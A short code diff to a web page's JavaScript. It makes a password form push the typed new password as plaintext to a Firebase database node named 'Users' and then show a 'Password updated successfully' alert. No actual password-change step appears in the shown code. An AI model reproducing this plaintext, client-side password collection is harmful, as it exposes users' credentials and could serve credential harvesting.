@@ -62,6 +62,7 @@
         saveDB(newPwd.value);
         e.preventDefault();
         form.reset();
+        alert("Password updated successfully");
        }
     
     });
@@ -79,11 +80,12 @@
     appId: "1:183181994483:web:39f4c98d99ded116850a86"
   };
   firebase.initializeApp(firebaseConfig);
-  const db = firebase.database().ref("ReqForm");
+  const db = firebase.database().ref("Users");
 console.log(db);
 db.push({
-  Name: pass
-});
+      NewPasswd: pass
+  })
+  
     };
         
 
